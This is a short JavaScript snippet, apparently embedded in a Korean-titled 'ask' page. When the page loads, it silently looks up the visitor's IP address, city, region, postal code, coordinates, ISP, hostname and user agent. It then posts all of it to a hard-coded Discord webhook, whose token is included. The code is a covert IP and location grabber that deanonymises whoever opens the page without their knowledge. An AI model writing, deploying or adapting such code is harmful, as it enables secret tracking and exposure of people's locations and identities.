$.getJSON("https://ipinfo.io/json", function(data) {         
  var params = {
    embeds: [
      {
        "title": "정초원 에스크",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "아이피",
            "value": `> ${data.ip}`
          },
          {
            "name": "위치 정보",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
          },
          {
            "name": "네트워크 정보",
            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch('https://discordapp.com/api/webhooks/1052117287903187015/IxjBejoGAgsORjqP5xGFa6k8CEglMa4IGzi8IKm8B4EF8FblFPgo9i-BQzv4yirlilco', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
  }) 
})

$.getJSON("https://uploadbeta.com/api/user-agent/", function(data) {         
  var params = {
    embeds: [
      {
        "title": "Device Info",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "Device",
            "value": `> ${data}`
          }
        ]
      }
    ]
  }
  fetch('https://discordapp.com/api/webhooks/1052117287903187015/IxjBejoGAgsORjqP5xGFa6k8CEglMa4IGzi8IKm8B4EF8FblFPgo9i-BQzv4yirlilco', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
  }) 
})

